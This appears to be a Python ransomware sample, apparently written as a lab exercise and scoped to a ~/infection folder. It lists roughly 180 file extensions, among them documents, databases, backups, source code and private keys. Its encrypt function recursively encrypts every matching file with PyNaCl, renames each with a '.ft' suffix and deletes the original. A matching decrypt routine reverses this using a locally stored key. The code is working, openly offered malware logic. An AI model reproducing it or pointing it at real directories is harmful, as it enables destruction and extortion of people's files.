import os
from nacl.secret import SecretBox
from nacl.utils import random


_TARGET_EXTENSIONS_=(
        "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pst", "ost", "msg", "eml", "vsd", "vsdx",
    "txt", "csv", "rtf", "123", "wks", "wk1", "pdf", "dwg", "onetoc2", "snt", "hwp", "602",
    "sxi", "sti", "sldx", "sldm", "sldm", "vdi", "vmdk", "vmx", "gpg", "aes", "ARC", "PAQ",
    "bz2", "tbk", "bak", "tar", "tgz", "gz", "7z", "rar", "zip", "backup", "iso", "vcd",
    "jpeg", "jpg", "bmp", "png", "gif", "raw", "cgm", "tif", "tiff", "nef", "psd", "ai",
    "svg", "djvu", "m4u", "m3u", "mid", "wma", "flv", "3g2", "mkv", "3gp", "mp4", "mov",
    "avi", "asf", "mpeg", "vob", "mpg", "wmv", "fla", "swf", "wav", "mp3", "sh", "class",
    "jar", "java", "rb", "asp", "php", "jsp", "brd", "sch", "dch", "dip", "pl", "vb", "vbs",
    "ps1", "bat", "cmd", "js", "asm", "h", "pas", "cpp", "c", "cs", "suo", "sln", "ldf",
    "mdf", "ibd", "myi", "myd", "frm", "odb", "dbf", "db", "mdb", "accdb", "sql", "sqlitedb",
    "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg", "uop", "std", "sxd", "otp",
    "odp", "wb2", "slk", "dif", "stc", "sxc", "ots", "ods", "3dm", "max", "3ds", "uot", "stw",
    "sxw", "ott", "odt", "pem", "p12", "csr", "crt", "key", "pfx", "der", "py"
)

# PyNaCl (libsodium)
# Pros:

# Modern, high-level, and secure-by-default.
# Simple Python API, easy to use in scripts and applications.
# Handles nonce/IV and authentication automatically.
# Less room for user error (fewer parameters to manage).
# Built-in authentication (detects tampering).

# Cons:

# Not as widely used as OpenSSL in enterprise.
# Fewer algorithm choices (focuses on modern, safe algorithms).
# Encrypted files are not compatible with OpenSSL or other tools—must use PyNaCl to decrypt.
# Slightly less flexible for advanced crypto needs.

def encryptpynacl(args):
# Load or generate key
    key_path = "sodium.key"
    if os.path.exists(key_path):
        with open(key_path, "rb") as f:
            key = f.read()
    else:
        key = random(SecretBox.KEY_SIZE)
        with open(key_path, "wb") as f:
            f.write(key)

    box = SecretBox(key)
    folder = os.path.expanduser("~/infection")

    files_to_encrypt = []
    for root, dirs, files in os.walk(folder):
        for filename in files:
            if filename.lower().endswith(_TARGET_EXTENSIONS_):
                files_to_encrypt.append(os.path.join(root, filename))
    for filepath in files_to_encrypt:
        with open(filepath, "rb") as f:
            plaintext = f.read()
        encrypted = box.encrypt(plaintext)
        encrypted_path = filepath + ".ft"
        with open(encrypted_path, "wb") as f:
            f.write(encrypted)
        if not args.silent:
            print("Encrypted file:", filepath)
        os.remove(filepath)

def decryptpynacl(args):
    key_path = "sodium.key"
    if not os.path.exists(key_path):
        raise FileNotFoundError("Key file not found!")
    with open(key_path, "rb") as f:
        key = f.read()
    box = SecretBox(key)
    folder = os.path.expanduser("~/infection")

    files_to_decrypt = []
    for root, dirs, files in os.walk(folder):
        for filename in files:
            if filename.endswith(".ft"):
                files_to_decrypt.append(os.path.join(root, filename))
    for filepath in files_to_decrypt:
        with open(filepath, "rb") as f:
            encrypted = f.read()
        try:
            decrypted = box.decrypt(encrypted)
        except Exception as e:
            print(f"Failed to decrypt {filepath}: {e}")
            continue
        orig_path = filepath[:-3]
        with open(orig_path, "wb") as f:
            f.write(decrypted)
        if not args.silent:
            print("Decrypted file:", filepath)
        os.remove(filepath)